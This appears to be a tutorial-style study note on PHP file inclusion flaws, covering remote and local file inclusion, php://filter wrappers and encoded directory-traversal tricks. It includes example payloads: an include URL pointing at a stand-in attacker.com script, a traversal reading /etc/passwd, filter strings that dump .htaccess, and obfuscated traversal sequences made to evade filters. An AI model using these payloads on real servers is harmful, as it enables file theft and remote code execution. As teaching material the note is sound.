# Remote File Inclusion

Remote File Inclusion, or RFI, is a vulnerability that allows attackers to include remote files, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.

Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files. For example, if a web application uses a URL in a GET parameter like include.php?page=http://attacker.com/exploit.php, an attacker can replace the URL with a path to a malicious script.

# Local File Inclusion

Local File Inclusion, or LFI, typically occurs when an attacker exploits vulnerable input fields to access or execute files on the server. Attackers usually exploit poorly sanitized input fields to manipulate file paths, aiming to access files outside the intended directory. For example, using a traversal string, an attacker might access sensitive files like include.php?page=../../../../etc/passwd.

# RFI vs LFI Exploitation Process

![51fca7adb2f8deb2d2bd3a83dc4d0c00](https://github.com/user-attachments/assets/142a7865-0629-4fb0-ba35-ad9f97715515)

# PHP Wrappers

PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.

|Payload | Output
|:-|:-
|php://filter/convert.base64-encode/resource=.htaccess |UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz
|php://filter/string.rot13/resource=.htaccess |ErjevgrRatvar ba Bcgvbaf -Vaqrkrf
|php://filter/string.toupper/resource=.htaccess |REWRITEENGINE ON OPTIONS -INDEXES
|php://filter/string.tolower/resource=.htaccess |rewriteengine on options -indexes
|php://filter/string.strip_tags/resource=.htaccess |RewriteEngine on Options -Indexes
|No filter applied |RewriteEngine on Options -Indexes

# Data Wrapper

The data stream wrapper is another example of PHP's wrapper functionality. The data:// wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code.

# Base Directory Breakout

Encoding transforms characters into a different format. In LFI, attackers commonly use URL encoding (percent-encoding), where characters are represented using percentage symbols followed by hexadecimal values. For instance, ../ can be encoded or obfuscated in several ways to bypass simple filters.

* Standard URL Encoding: ../ becomes %2e%2e%2f
* Double Encoding: Useful if the application decodes inputs twice. ../ becomes %252e%252e%252f
* Obfuscation: Attackers can use payloads like ....//, which help in avoiding detection by simple string matching or filtering mechanisms. This obfuscation technique is intended to conceal directory traversal attempts, making them less apparent to basic security filters.

